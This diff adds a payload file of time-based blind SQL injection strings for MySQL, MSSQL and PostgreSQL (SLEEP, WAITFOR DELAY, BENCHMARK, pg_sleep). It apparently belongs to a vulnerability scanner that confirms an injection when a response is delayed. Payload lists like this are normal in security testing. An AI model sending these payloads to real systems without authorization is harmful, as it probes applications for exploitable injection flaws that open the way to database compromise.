@@ -1,0 +1,16 @@
+# Time-Based Blind SQL Injection Payloads
+# These cause the database to sleep/wait if the injection point is vulnerable
+# Scanner measures response time — if >4.5s longer than baseline, confirmed
+' OR SLEEP(5)--
+" OR SLEEP(5)--
+' AND SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+" AND SLEEP(5)--
+') OR SLEEP(5)--
+1' AND SLEEP(5)--
+' OR BENCHMARK(5000000,SHA1('test'))--
+' AND (SELECT SLEEP(5))--
+1; WAITFOR DELAY '0:0:5'--
+' OR pg_sleep(5)--
+" OR pg_sleep(5)--
+'; SELECT pg_sleep(5)--
